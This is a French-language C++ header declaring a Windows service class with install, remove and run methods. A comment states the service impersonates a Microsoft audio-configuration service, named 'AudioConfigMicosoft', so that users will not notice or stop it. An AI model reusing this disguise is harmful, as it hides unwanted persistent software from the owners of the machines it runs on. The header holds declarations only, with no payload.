/*
 *
 *  Gestion du Service Windows
 *
 *
 *  © 2015 - Guillaume Gonnet
 *  License GPLv2
 */


#ifndef WINDOWSSERVICE_H
#define WINDOWSSERVICE_H



#include "string"

using namespace std;


#ifdef _WIN32_WINNT
#undef _WIN32_WINNT
#endif

#define _WIN32_WINNT 0x0501



#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>



/*

On se fait passer pour quelque chose d'important pour pas se faire découvrir.
En effet, pas beaucoup de gens vont arrêter quelque chose qui s'appelle "Configuration des périphériques audio" !

*/


// Nom du service
#define SERVICE_NAME L"AudioConfigMicosoft"

// Nom à afficher
#define SERVICE_DISPLAY_NAME L"Configuration des périphériques audio"

// Description du service
#define SERVICE_DES L"Ce service gère la configuration automatique des périphériques audio."



class WindowsService
{


public:

    WindowsService();

    bool install(string args = "");

    bool remove();

    void start();

    bool runAsService();


private:

    // Nom du service
    string m_name;
    wstring m_wname;

    wstring m_displayname;


    // Fonctions pour mode Service
    static void WINAPI serviceMain( DWORD, char ** );

    static DWORD WINAPI serviceCtrl( DWORD _ctrlcode, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext );

    static bool reportStatus(DWORD state, DWORD exitCode);

    static void mainLoop();


    // Variables statiques
    static WindowsService *s_this;
    static SERVICE_STATUS s_status;
    static SERVICE_STATUS_HANDLE s_statusHandle;
    static HANDLE s_stopServiceEvent;

};



#endif // WINDOWSSERVICE_H
